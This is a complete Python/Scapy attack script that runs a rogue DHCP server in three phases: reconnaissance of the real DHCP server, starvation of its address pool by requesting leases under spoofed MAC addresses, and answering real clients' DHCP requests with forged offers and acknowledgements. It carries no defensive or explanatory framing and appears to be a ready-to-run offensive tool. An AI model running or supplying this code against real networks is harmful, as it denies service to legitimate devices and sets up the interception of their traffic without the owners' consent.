import time
import random
import socket
from scapy.all import *

# Tell Scapy not to drop packets if the IP doesn't match the interface natively
conf.checkIPaddr = False 

class PortableRogueDHCP:
    def __init__(self):
        self.iface = conf.iface # Auto-detects the active interface
        self.server_mac = get_if_hwaddr(self.iface)
        self.server_ip = self.get_local_ip()
        
        self.network_info = {}
        self.hoarded_ips = []
        self.pending_offers = {} # Tracks {client_mac: offered_ip}

        print(f"[VERBOSE] Initialization Complete.")
        print(f"[VERBOSE] Active Interface: {self.iface}")
        print(f"[VERBOSE] True Hardware MAC: {self.server_mac}")
        print(f"[VERBOSE] True Local IP: {self.server_ip}")
        
    def get_local_ip(self):
        """The UDP dummy socket trick for bulletproof local IP detection."""
        print("[VERBOSE] Determining local IP via UDP routing trick...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Doesn't actually send a packet, just queries the OS routing table
            s.connect(('8.8.8.8', 80)) 
            ip = s.getsockname()[0]
            s.close()
            print(f"[VERBOSE] UDP socket trick succeeded. IP: {ip}")
            return ip
        except Exception as e:
            print(f"[VERBOSE] UDP trick failed ({e}). Falling back to Scapy native.")
            return get_if_addr(conf.iface)

    def generate_mac(self):
        """Generates a random MAC address for spoofing."""
        return str(RandMAC())

    def get_dhcp_options(self, packet):
        """Extracts DHCP options into a clean dictionary."""
        options = {}
        if packet.haslayer(DHCP):
            for opt in packet[DHCP].options:
                if isinstance(opt, tuple):
                    options[opt[0]] = opt[1]
        return options

    def phase_1_recon(self):
        """Sends a probe DISCOVER to learn the network topology."""
        print(f"\n{'='*50}")
        print(f"[*] PHASE 1: NETWORK RECONNAISSANCE")
        print(f"{'='*50}")
        
        probe_mac_str = self.generate_mac()
        probe_mac_bytes = mac2str(probe_mac_str)
        xid = random.randint(1, 900000000)

        print(f"[VERBOSE] Forging Recon MAC: {probe_mac_str}")
        print(f"[VERBOSE] Generating Recon Transaction ID (XID): {xid}")
        print("[VERBOSE] Crafting DHCP DISCOVER packet...")

        eth = Ether(src=probe_mac_str, dst="ff:ff:ff:ff:ff:ff")
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(chaddr=probe_mac_bytes, xid=xid)
        dhcp = DHCP(options=[("message-type", "discover"), "end"])
        
        probe_packet = eth / ip / udp / bootp / dhcp
        
        print("[VERBOSE] Broadcasting Recon DISCOVER to network... waiting up to 5 seconds for reply.")
        ans = srp1(probe_packet, iface=self.iface, timeout=5, verbose=False)
        
        if ans and ans.haslayer(DHCP):
            print("[VERBOSE] Reply received! Parsing DHCP options...")
            opts = self.get_dhcp_options(ans)
            self.network_info['gateway'] = opts.get('router', 'Unknown')
            self.network_info['subnet_mask'] = opts.get('subnet_mask', '255.255.255.0')
            self.network_info['dns'] = opts.get('domain_name_server', '8.8.8.8')
            self.network_info['real_dhcp_ip'] = opts.get('server_id', 'Unknown')
            
            print("[+] Recon Successful! Network Blueprint extracted:")
            print(f"    - Target Router IP: {self.network_info['real_dhcp_ip']}")
            print(f"    - Gateway: {self.network_info['gateway']}")
            print(f"    - Subnet Mask: {self.network_info['subnet_mask']}")
            print(f"    - DNS: {self.network_info['dns']}")
            return True
        else:
            print("[-] Recon Failed. No DHCP OFFER received. Check network connection.")
            return False

    def phase_2_heist(self, count=10):
        """Spoofs MACs to request and hoard IPs from the real router."""
        print(f"\n{'='*50}")
        print(f"[*] PHASE 2: IP HEIST (Targeting {count} IPs)")
        print(f"{'='*50}")
        
        for i in range(count):
            fake_mac_str = self.generate_mac()
            fake_mac_bytes = mac2str(fake_mac_str)
            xid = random.randint(1, 900000000)

            print(f"\n[VERBOSE] --- Steal Attempt {i+1}/{count} ---")
            print(f"[VERBOSE] Spoofing MAC: {fake_mac_str} | XID: {xid}")
            
            # 1. DISCOVER
            print("[VERBOSE] Sending DISCOVER...")
            eth = Ether(src=fake_mac_str, dst="ff:ff:ff:ff:ff:ff")
            ip = IP(src="0.0.0.0", dst="255.255.255.255")
            udp = UDP(sport=68, dport=67)
            bootp = BOOTP(chaddr=fake_mac_bytes, xid=xid)
            dhcp_discover = DHCP(options=[("message-type", "discover"), "end"])
            
            ans = srp1(eth / ip / udp / bootp / dhcp_discover, iface=self.iface, timeout=2, verbose=False)
            
            if ans and ans.haslayer(DHCP):
                offered_ip = ans[BOOTP].yiaddr
                print(f"[VERBOSE] Router offered IP: {offered_ip}. Crafting REQUEST to lock it...")
                
                # 2. REQUEST to lock it in
                dhcp_request = DHCP(options=[
                    ("message-type", "request"),
                    ("server_id", self.network_info['real_dhcp_ip']),
                    ("requested_addr", offered_ip),
                    "end"
                ])
                sendp(eth / ip / udp / bootp / dhcp_request, iface=self.iface, verbose=False)
                self.hoarded_ips.append(offered_ip)
                print(f"[+] Hoard Update: Locked in {offered_ip} under MAC {fake_mac_str}")
            else:
                print(f"[VERBOSE] No offer received for MAC {fake_mac_str}. Moving to next.")
            
            time.sleep(0.2) # Be gentle on the local router

        print(f"\n[+] Heist Complete. Total IPs in hoard: {len(self.hoarded_ips)}")
        print(f"[VERBOSE] Hoarded IPs: {self.hoarded_ips}")

    def phase_3_serve(self, packet):
        """Listens for real clients, handles DORA, and manages the hoard."""
        if not packet.haslayer(DHCP):
            return

        opts = self.get_dhcp_options(packet)
        msg_type = opts.get('message-type')
        client_mac = packet[Ether].src
        client_mac_bytes = packet[BOOTP].chaddr
        xid = packet[BOOTP].xid

        # Ignore our own outgoing packets
        if client_mac == self.server_mac:
            return

        # --- DORA: DISCOVER ---
        if msg_type == 1: 
            print(f"\n[VERBOSE] >> Received DHCP DISCOVER from MAC: {client_mac} | XID: {xid}")
            if not self.hoarded_ips:
                print(f"[VERBOSE] [-] Hoard is empty! Cannot service {client_mac}. Ignoring.")
                return
            
            offer_ip = self.hoarded_ips.pop(0)
            self.pending_offers[client_mac] = offer_ip 
            print(f"[VERBOSE] Popped {offer_ip} from hoard. (Remaining hoard size: {len(self.hoarded_ips)})")
            print(f"[*] [OFFER] Offering {offer_ip} to {client_mac}...")

            eth = Ether(src=self.server_mac, dst=client_mac)
            ip = IP(src=self.server_ip, dst="255.255.255.255") 
            udp = UDP(sport=67, dport=68)
            bootp = BOOTP(op=2, yiaddr=offer_ip, siaddr=self.server_ip, chaddr=client_mac_bytes, xid=xid)
            dhcp = DHCP(options=[
                ("message-type", "offer"),
                ("subnet_mask", self.network_info['subnet_mask']),
                ("router", self.network_info['gateway']),
                ("domain_name_server", self.network_info['dns']),
                ("lease_time", 3600),
                ("server_id", self.server_ip),
                "end"
            ])
            sendp(eth / ip / udp / bootp / dhcp, iface=self.iface, verbose=False)
            print("[VERBOSE] OFFER packet injected into network.")

        # --- DORA: REQUEST ---
        elif msg_type == 3: 
            requested_server_id = opts.get('server_id')
            req_ip = opts.get('requested_addr')
            
            print(f"\n[VERBOSE] >> Received DHCP REQUEST from MAC: {client_mac} | XID: {xid}")
            print(f"[VERBOSE] Client is requesting IP {req_ip} from Server ID {requested_server_id}")

            # Did the client choose our server?
            if requested_server_id == self.server_ip:
                print(f"[+] [WIN] Client {client_mac} accepted our offer for {req_ip}!")
                
                # Remove from pending, finalize lease
                if client_mac in self.pending_offers:
                    del self.pending_offers[client_mac]
                    print(f"[VERBOSE] Removed {client_mac} from pending offers.")

                print("[VERBOSE] Crafting final DHCP ACK...")
                eth = Ether(src=self.server_mac, dst=client_mac)
                ip = IP(src=self.server_ip, dst="255.255.255.255")
                udp = UDP(sport=67, dport=68)
                bootp = BOOTP(op=2, yiaddr=req_ip, siaddr=self.server_ip, chaddr=client_mac_bytes, xid=xid)
                dhcp_ack = DHCP(options=[
                    ("message-type", "ack"),
                    ("subnet_mask", self.network_info['subnet_mask']),
                    ("router", self.network_info['gateway']),
                    ("domain_name_server", self.network_info['dns']),
                    ("lease_time", 3600),
                    ("server_id", self.server_ip),
                    "end"
                ])
                sendp(eth / ip / udp / bootp / dhcp_ack, iface=self.iface, verbose=False)
                print("[VERBOSE] ACK sent. Lease finalized.")

            # Client chose another server (the real router beat us)
            elif requested_server_id and requested_server_id != self.server_ip:
                print(f"[VERBOSE] [-] Race lost. Client chose real router ({requested_server_id}).")
                if client_mac in self.pending_offers:
                    reclaimed_ip = self.pending_offers.pop(client_mac)
                    self.hoarded_ips.append(reclaimed_ip)
                    print(f"[*] [RECLAIM] Snatched {reclaimed_ip} back from pending and returned to hoard.")
                    print(f"[VERBOSE] Current hoard size: {len(self.hoarded_ips)}")

    def start(self):
        if self.phase_1_recon():
            self.phase_2_heist(count=10)
            if self.hoarded_ips:
                print(f"\n{'='*50}")
                print(f"[*] PHASE 3: SERVER LIVE")
                print(f"{'='*50}")
                print(f"[VERBOSE] Listening on {self.iface} (UDP 67/68) for client broadcasts...")
                sniff(filter="udp and (port 67 or 68)", prn=self.phase_3_serve, store=0, iface=self.iface)

if __name__ == "__main__":
    server = PortableRogueDHCP()
    server.start()